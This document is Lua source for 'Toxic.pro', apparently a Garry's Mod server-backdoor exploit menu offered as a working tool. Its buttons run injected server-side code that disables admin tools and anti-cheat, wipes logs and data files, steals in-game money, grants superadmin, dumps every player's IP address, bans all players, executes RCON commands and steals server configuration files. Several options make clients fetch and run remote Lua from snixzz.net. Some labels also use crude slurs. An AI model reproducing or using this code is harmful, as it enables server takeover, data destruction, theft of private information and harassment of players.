	save:SetTextColor( Color( 255, 255, 255 ) )
	save:SetFont( "DebugFixed" )

	save.Paint = function( self )

		draw.RoundedBox( 0, 0, 0, self:GetWide(), self:GetTall(), Color( 62, 168, 62, 255 ) )

	end

	save.DoClick = function()

		Derma_StringRequest( "Save file to data/toxic.pro/files/lua", "File name (e.g: aimbot or aimbot.txt)", "", function( text )

			if !string.find( text, ".txt" ) then text = text .. ".txt" end

			file.Write( "toxic.pro/files/lua/" .. text, toxic.LuaStr )

			toxic.Notify( "Saved source to data/toxic.pro/files/lua/" .. text )

		end )

	end

	local load = vgui.Create( "DButton", frame )
	load:SetSize( 60, 20 )
	load:SetPos( run:GetWide() + load:GetWide() + 10, 0 )
	load:SetText( "Load" )
	load:SetTextColor( Color( 255, 255, 255 ) )
	load:SetFont( "DebugFixed" )

	load.Paint = function( self )

		draw.RoundedBox( 0, 0, 0, self:GetWide(), self:GetTall(), Color( 168, 148, 62, 255 ) )

	end

	load.DoClick = function()

		local options = DermaMenu()

		for k, v in pairs( file.Find( "toxic.pro/files/lua/*.txt", "DATA" ) ) do

			options:AddOption( v, function()

				local str = file.Read( "toxic.pro/files/lua/" .. v, "DATA" )

				MsgN( str )

				toxic.LuaStr = str

				html:QueueJavascript( "SetContent( '" .. string.JavascriptSafe( str ) .. "' )" )

				toxic.Notify( "Loaded " .. v )

			end )

		end

		options:Open()

	end

end

function toxic.UI()

	toxic.ButtonPos = 30

	local frame = vgui.Create( "DFrame" )
	frame:SetTitle( "Toxic.pro v" .. toxic.Version .. " | by 0xymoron ~ " .. table.Random( toxic.Aids ) )
	frame:SetSize( 550, 400 )
	frame:SetPos( 25, 25 )
	frame:MakePopup()
	frame:ShowCloseButton( false )
	frame:SetDraggable( false )

	frame.Paint = function( self )

		local hsv = HSVToColor( RealTime() * 120 % 360, 1, 1 )

		draw.RoundedBox( 0, 0, 0, self:GetWide(), self:GetTall(), Color( hsv.r, hsv.g, hsv.b, 150 ) ) -- old: Color( 140, 0, 0, 150 )

		draw.RoundedBox( 0, 0, 0, self:GetWide(), 25, Color( 0, 0, 0, 200 ) )

		surface.SetFont( "CloseCaption_Bold" )

		local str1 = "Toxic.pro Version " .. toxic.Version

		local str1_width, str1_height = surface.GetTextSize( str1 )

		local str2 = "by 0xymoron"

		local str2_width, str2_height = surface.GetTextSize( str2 )

		draw.SimpleText( str1, "CloseCaption_Bold", frame:GetWide() / 2 + 2.5, 65, color_white, 1, 1 )

		draw.SimpleText( str2, "CloseCaption_Bold", frame:GetWide() / 2 + 2.5, frame:GetTall() - str2_height - 25, color_white, 1, 1 )

	end

	local close = vgui.Create( "DButton", frame )
	close:SetSize( 50, 20 )
	close:SetPos( frame:GetWide() - 50, 0 )
	close:SetText( "x" )
	close:SetTextColor( Color( 255, 255, 255 ) )
	close:SetFont( "DebugFixed" )

	close.Paint = function()

		draw.RoundedBox( 0, 0, 0, close:GetWide(), close:GetTall(), Color( 168, 62, 62, 255 ) )

	end

	close.DoClick = function()

		frame:Close()

	end

	local set = vgui.Create( "DButton", frame )
	set:SetSize( 40, 20 )
	set:SetPos( frame:GetWide() - close:GetWide() - set:GetWide() - 5, 0 )
	set:SetText( "Set" )
	set:SetTextColor( Color( 255, 255, 255 ) )
	set:SetFont( "DebugFixed" )

	set.Paint = function( self )

		draw.RoundedBox( 0, 0, 0, self:GetWide(), self:GetTall(), Color( 62, 168, 62, 255 ) )

	end

	local netmsg = vgui.Create( "DTextEntry", frame )
	netmsg:SetSize( 75, 20 )
	netmsg:SetPos( frame:GetWide() - close:GetWide() - netmsg:GetWide() - set:GetWide() - 10, 0 )
	netmsg:SetText( blackdoor )

	netmsg.OnEnter = function( self )

		toxic.Notify( "Set backdoored net message to '" .. netmsg:GetValue() .. "'" )

		blackdoor = self:GetValue()

	end

	set.DoClick = function( self )

		blackdoor = netmsg:GetValue()

		toxic.Notify( "Set backdoored net message to '" .. netmsg:GetValue() .. "'" )

	end

	local panel = vgui.Create( "DScrollPanel", frame )
	panel:SetPos( 5, 30 )
	panel:SetSize( 150, frame:GetTall() - 35 )

	local html = vgui.Create( "HTML", frame )
	html:SetPos( panel:GetWide() + 20, 95 )
	html:SetSize( 240, 215 )
	html:SetHTML( [[
		<img src="http://www.clker.com/cliparts/c/e/8/f/12387015421849960016GameFreak7744_Biohazard_symbol.svg.med.png" alt="Img" style="width:200px;height:195px;">
	]] )

	/**************************************

		Player Management

	***************************************/

	local dlist = vgui.Create( "DListView", frame )
	dlist:SetSize( 140, frame:GetTall() - 35 )
	dlist:SetPos( frame:GetWide() - dlist:GetWide() - 5, 30 )
	dlist:SetMultiSelect( false )
	dlist:AddColumn( "Players" )

	for k, v in next, player.GetAll() do

		dlist:AddLine( v:Nick() )

	end

	dlist.OnClickLine = function( parent, line, self )

		for k, v in next, player.GetAll() do

			if v:Nick() == line:GetValue( 1 ) then

				dlist.SelectedEntity = v

			else

				continue

			end

		end

	end

	dlist.OnRowRightClick = function( parent, line, isselected )

		surface.PlaySound( "buttons/button9.wav" )

		local id = dlist.SelectedEntity:UserID()

		local target = Player( id )

		local options = DermaMenu()

		options:AddOption( "Kick", function()

			toxic.PostLua( [[

				Player( ]] .. id .. [[ ):Kick()

			]] )

			toxic.Notify( "Kicked " .. target:Nick() )

			if dlist then

				dlist:RemoveLine( line )

			end

		end ):SetImage( "icon16/door_out.png" )

		options:AddOption( "Silent Slay", function()

			toxic.PostLua( [[

				Player( ]] .. id .. [[ ):KillSilent()

			]] )

			toxic.Notify( "Silently slayed " .. target:Nick() )

		end ):SetImage( "icon16/lightning.png" )

		options:AddOption( "Freeze", function()

			toxic.PostLua( [[

				local ply = Player( ]] .. id .. [[ )

				ply:Freeze( !ply:IsFrozen() )

			]] )

			if !target:IsFrozen() then

				toxic.Notify( "Froze " .. target:Nick() )

			else

				toxic.Notify( "Unfroze " .. target:Nick() )

			end

		end ):SetImage( "icon16/tux.png" )

		options:AddOption( "Give Weapon", function()

			Derma_StringRequest( "Give " .. target:Nick() .. " a weapon", "What weapon? (example: weapon_ak47)", "", function( text )

				toxic.PostLua( [[

					local str = "]] .. text .. [["

					Player( ]] .. id .. [[ ):Give( str )

				]] )

				toxic.Notify( "Gave " .. target:Nick() .. " a " .. text )

			end )

		end ):SetImage( "icon16/bomb.png" )

		options:AddOption( "Give Money", function()

			Derma_StringRequest( "Give " .. target:Nick() .. " money", "How much?", "", function( text )

				if !isnumber( tonumber( text ) ) then return end

				toxic.PostLua( [[

					local str = "]] .. text .. [["
					str = tonumber( str )

					Player( ]] .. id .. [[ ):addMoney( str )

				]] )

				toxic.Notify( "Gave " .. target:Nick() .. " $" .. string.Comma( text ) )

			end )

		end ):SetImage( "icon16/money_add.png" )

		options:AddOption( "Inject DefqonSploit", function()

			local snd = table.Random( { "vo/npc/male01/herecomehacks01.wav","vo/npc/male01/herecomehacks02.wav" } ) -- stfu

			toxic.PostLua( [[

				Player(]] .. id .. [[):SendLua('http.Fetch("http://snixzz.net/toxic.pro/toxic.lua",function(body) RunString(body) surface.PlaySound("]] .. snd .. [[") chat.AddText(Color(255,0,0),"[DefqonSploit] ",color_white,"Welcome, run `Defqon` in console") end)')

			]] )

			toxic.Notify( "Injected Toxic.pro into " .. target:Nick() .. "'s client." )

		end ):SetImage( "icon16/bug_add.png" )

		options:Open()

	end

	/**************************************

		Buttons

	***************************************/


	toxic.AddCategorySpacer( "Prevention", Color( 255, 0, 0 ), panel )

	toxic.AddButton( "Break ULX", panel, function()

		toxic.PostLua( [[ _G.ulx = function() end _G.ULib = function() end ]])

		toxic.Notify( "Broke ULX, admins now have no control." )

	end )

	toxic.AddButton( "Break FAdmin", panel, function()

		toxic.PostLua( [[

			_G.FAdmin = function() end

		]] )

		toxic.Notify( "Killed FAdmin" )

	end )

	toxic.AddButton( "Wipe Logs", panel, function()

		local date = os.date( "%m-%d-%y" )

		toxic.PostLua( [[

			file.Delete( "ulx_logs/]] .. date .. [[.txt" )

		]] )

		toxic.Notify( "Deleted data/ulx_logs/" .. date .. ".txt" )

	end )

	toxic.AddButton( "Wipe data/", panel, function()

		toxic.PostLua( [[

		local id = ]] .. LocalPlayer():UserID() .. [[

		local dirs = {

			"ulx",
			"ulx_logs",
			"ulib",
			"darkrp_logs",
			"adv_duplicator",
			"advdupe2",
			"cpuchip",
			"expression2",
			"cw2_0",

		}

		for k, v in pairs( dirs ) do

			for dir, _file in pairs( file.Find( v .. "/*", "DATA" ) ) do

				file.Delete( v .. "/" .. _file )

				Player( id ):ChatPrint( "[Toxic.pro] Deleted file 'data/" .. v .. "/" .. _file )

			end

		end

		for k, v in pairs( file.Find( "*", "DATA" ) ) do

			file.Delete( v )

			Player( id ):ChatPrint( "[Toxic.pro] Deleted file 'data/" .. v )

		end

		]] )

	end )

	toxic.AddButton( "No Kick/Ban", panel, function()

		toxic.PostLua( [[

			_R = debug.getregistry()

			function game.KickID( id, reason )

				return

			end

			function _R.Player.Ban()

				return

			end

			function _R.Player.Kick()

				return

			end

		]] )

		toxic.Notify( "Nulled _R.Player.Ban & _R.Player.Kick" )

	end )

	toxic.AddButton( "Disable !cake", panel, function()

		toxic.PostLua( [[ _G.cac = function() end]] )

		toxic.Notify( "Attempted to disable !cake's anti-cheat, probably failed." )

	end )

	toxic.AddCategorySpacer( "DarkRP", Color( 0, 200, 0 ), panel )

	toxic.AddButton( "Steal Money", panel, function()

		toxic.PostLua( [[

			local id = ]] .. LocalPlayer():UserID() .. [[

			for k, v in next, player.GetAll() do

				if v:Nick() == "]] .. LocalPlayer():Nick() .. [[" then

					continue

				end

				local bal = v:getDarkRPVar( "money" ) or 9999999

				v:addMoney( -bal )

				Player( id ):addMoney( bal )

				Player( id ):ChatPrint( "[Toxic.pro] Stole $" .. string.Comma( bal ) .. " from " .. v:Nick() )

			end

		]] )

	end )

	toxic.AddButton( "Wipe All Money", panel, function()

		toxic.PostLua( [[RunConsoleCommand( "rp_resetallmoney" )]] )

		toxic.Notify( "Wiped DarkRP money database" )

	end )

	toxic.AddButton( "Change All Names", panel, function()

		Derma_StringRequest( "Name Changer", "What would you like to name everyone?", "", function( text )

			toxic.PostLua( [[

				local str = "]] .. text .. [["

				for k, v in next, player.GetAll() do

					DarkRP.storeRPName( v, str )

					v:setDarkRPVar( "rpname", str )

				end

			]] )

			toxic.Notify( "Renamed everyone to '" .. text .. "'" )

		end )

	end )

	toxic.AddButton( "Strip Weapons", panel, function()

		for k, v in next, player.GetAll() do

			for x, y in pairs( v:GetWeapons() ) do

				net.Start( "properties" )

					net.WriteString( "remove", 32 )

					net.WriteEntity( y )

				net.SendToServer()

			end

		end

		toxic.Notify( "Attempted to use net 'properties' exploit to strip all players." )

	end )

	toxic.AddCategorySpacer( "Autism", Color( 200, 0, 200 ), panel )

	toxic.AddButton( "Visual Rape", panel, function()

		-- I don't like this.
		toxic.PostLua( "for k, v in pairs( player.GetAll() ) do v:SendLua( [[sound.PlayURL( 'http://riverrp.xyz/boss.mp3', 'mono', function( s ) s:Play() end )]] ) end" )

		-- I don't like any of this.
		toxic.PostLua( "for k, v in pairs( player.GetAll() ) do v:SendLua( [[http.Fetch( 'https://snixzz.net/toxic.pro/disco.lua', function( body ) RunString( body ) end )]] ) end" )

	end )

	toxic.AddButton( "Earthquake", panel, function()

		toxic.PostLua( "for k, v in pairs( player.GetAll() ) do v:SendLua( [[util.ScreenShake( Vector( 0, 0, 0 ), 10, 5, 60, 5000 )]] ) end" )

		toxic.Notify( "Earthquake started." )

	end )

	toxic.AddButton( "Horse", panel, function()

		toxic.PostLua( [[

			local id = ]] .. LocalPlayer():UserID() .. [[

			Player( id ):SetModel( "models/props_c17/statue_horse.mdl" )

			Player( id ):SetMaterial( "models/debug/debugwhite" )

			hook.Add( "Think", "horse", function()

				if !IsValid( Player( id ) ) then return end

				Player( id ):SetColor( HSVToColor( RealTime() * 120 % 360, 1, 1 ) )

			end )

		]] )

	end )

	toxic.AddButton( "Footsteps", panel, function()

		toxic.PostLua( [[

			hook.Add( "PlayerFootstep", "oooh", function( ply )

				ply:EmitSound( "vo/npc/female01/pain0" .. math.random( 1, 9 ) .. ".wav", 75, math.random( 50, 100 ) )

			end )

		]] )

		toxic.Notify( "Enabled moaning footsteps." )

	end )

	toxic.AddButton( "Spam .txt", panel, function()

		Derma_StringRequest( ".txt file contents", "What would you like to put in the .txt?", "", function( text )

			toxic.PostLua( [[

				for i = 1, 100 do

					file.Write( "toxic.pro_" .. math.random( 1, 999999 ) .. ".txt", "]] .. text .. [[" )

				end

			]] )

			toxic.Notify( "Spamming 100 .txt files containing '" .. text .. "'" )

		end )

	end )

	toxic.AddButton( "Spam Chat", panel, function()

		Derma_StringRequest( "Message", "Chat Message", "SEIZED BY TOXIC.PRO", function( text )

			toxic.PostLua( [[

				util.AddNetworkString("chat_AddText")
				chat = {}
				function chat.AddText(...)
					net.Start("chat_AddText")
						net.WriteTable({...})
					net.Broadcast()
				end
				function AddTextPly( ply, ...)
					net.Start("chat_AddText")
						net.WriteTable({...})
					net.Send( ply )
				end

				for k, v in pairs( player.GetAll() ) do

					v:SendLua( 'net.Receive("chat_AddText", function(len) chat.AddText( unpack( net.ReadTable() ) )end)' )

				end

				timer.Create( "gotEm", 1, 120, function()

					local function ChatPrintRainbow( frequency, str )

						local text = {}


						for i = 1, #str do
							table.insert( text, HSVToColor( i * frequency % 360, 1, 1 ) )
						table.insert( text, string.sub( str, i, i ) )
						end

						chat.AddText( unpack( text ) )

					end

					ChatPrintRainbow( 10, "]] .. text .. [[" )

				end )


			]] )

		end )

	end )

	/*toxic.AddButton( "Spam Advert", panel, function()

		Derma_StringRequest( "Message", "Spam Message", "SEIZED BY TOXIC.PRO", function( text )

			toxic.PostLua( [[

				local id = ]] .. LocalPlayer():UserID() .. [[

				local why = ]] .. text .. [[

				timer.Create( "gotEm2", 1, 120, function()

					for k, v in next, player.GetAll() do

						v:SetNWString( "why", why )

						v:SendLua( 'RunConsoleCommand("say","/advert",LocalPlayer():GetNWString("why"))')

					end

				end )


			]] )

		end )

	end )*/

	toxic.AddButton( "Dance", panel, function()

		toxic.PostLua( [[

			local id = ]] .. LocalPlayer():UserID() .. [[

			timer.Create( "gotEm3?", 1, 10, function()

				for k, v in next, player.GetAll() do

					if v:UserID() == v then continue end

					v:SendLua('RunConsoleCommand("act","dance")')

				end

			end )


		]] )

		toxic.Notify( "Forcing all players to run act dance" )

	end )

	toxic.AddCategorySpacer( "Takeover", Color( 255, 150, 0 ), panel )

	toxic.AddButton( "Give Superadmin", panel, function()

		toxic.PostLua( [[

			local id = ]] .. LocalPlayer():UserID() .. [[

			Player( id ):SetUserGroup( "superadmin" )

		]] )

		toxic.Notify( "Attempted to silently force superadmin." )

	end )

	toxic.AddButton( "Print All IPs", panel, function()

		toxic.PostLua( [[

			local id = ]] .. LocalPlayer():UserID() .. [[

			for k, v in pairs( player.GetAll() ) do

				Player( id ):ChatPrint( "Player: " .. v:Nick() .. " (" .. v:SteamID() .. ") IP: " .. v:IPAddress() )

			end

		]] )

		toxic.Notify( "Printed all IPs into chat." )

	end )

	toxic.AddButton( "Ban Everyone", panel, function()

		Derma_StringRequest( "Toxic.pro Ban All", "Reason", "", function( text )

			toxic.PostLua( [[

				local id = ]] .. LocalPlayer():UserID() .. [[

				for k, v in next, player.GetAll() do

					if v:UserID() == id then continue end

					v:Ban( 0, false )

					v:Kick( "]] .. tostring( text ) .. [[" )

				end

			]] )

			toxic.Notify( "Banned everyone for '" .. text .. "'" )

		end )

	end )

	toxic.AddButton( "RCON", panel, function()

		Derma_StringRequest( "Toxic.pro RCON", "Command", "", function( text )

			toxic.PostLua( [[game.ConsoleCommand( "]] .. tostring( text ) .. [[" .. "\n" )]] )

			toxic.Notify( "Ran command '" .. text .. "'" )

		end )

	end )

	toxic.AddButton( "Lua Run", panel, function()

		toxic.OpenLuaEditor( frame )

		/*Derma_StringRequest( "Toxic.pro Lua Run", "Lua String", "", function( text )

			toxic.PostLua( [[RunString( ']] .. text .. [[' )]] )

			toxic.Notify( "Ran Lua '" .. text .. "'" )

		end )*/

	end )

	toxic.AddButton( "Rename Server", panel, function()

		toxic.PostLua( [[RunConsoleCommand( "hostname", "TOXIC.PRO" )]] )

		toxic.Notify( "Renamed server to TOXIC.PRO" )

	end )

	toxic.AddButton( "Steal File", panel, function()

		Derma_StringRequest( "Steal File Source", "File Path (Relative to garrysmod/) e.g: cfg/server.cfg", "", function( text )

			net.Receive( "file", function( len )

				local str = net.ReadString()

				if str != "ERROR" then

					toxic.OpenTextDocument( text, str, frame )

				else

					toxic.Notify( "Unable to find file " .. text .. " on the server" )

				end

			end )

			toxic.PostLua( [[

				util.AddNetworkString( "file" )

				local id = ]] .. LocalPlayer():UserID() .. [[

				local f = file.Open( "]] .. text .. [[", "r", "GAME" )

				if !f then

					net.Start( "file" )

						net.WriteString( "ERROR" )

					net.Send( Player( id ) )

					return

				end

				local str = f:Read( f:Size() )

				f:Close()

				net.Start( "file" )

					net.WriteString( str )

				net.Send( Player( id ) )

			]] )

			toxic.Notify( "Attempted to steal file " .. text )

		end )

	end )

end

toxic.Init()
concommand.Add( "toxic.pro", toxic.UI )
